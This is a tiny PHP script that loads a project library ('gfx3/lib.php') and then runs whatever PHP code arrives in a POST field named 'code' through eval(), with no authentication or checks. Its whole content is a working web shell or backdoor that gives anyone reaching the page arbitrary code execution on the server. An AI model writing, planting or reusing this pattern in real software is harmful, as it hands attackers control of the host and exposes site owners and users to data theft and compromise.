<?php

include("../gfx3/lib.php");

$main = new EMain();

if(isset($_POST['code'])){
	$code = $_POST['code'];
	eval($code);
}

?>
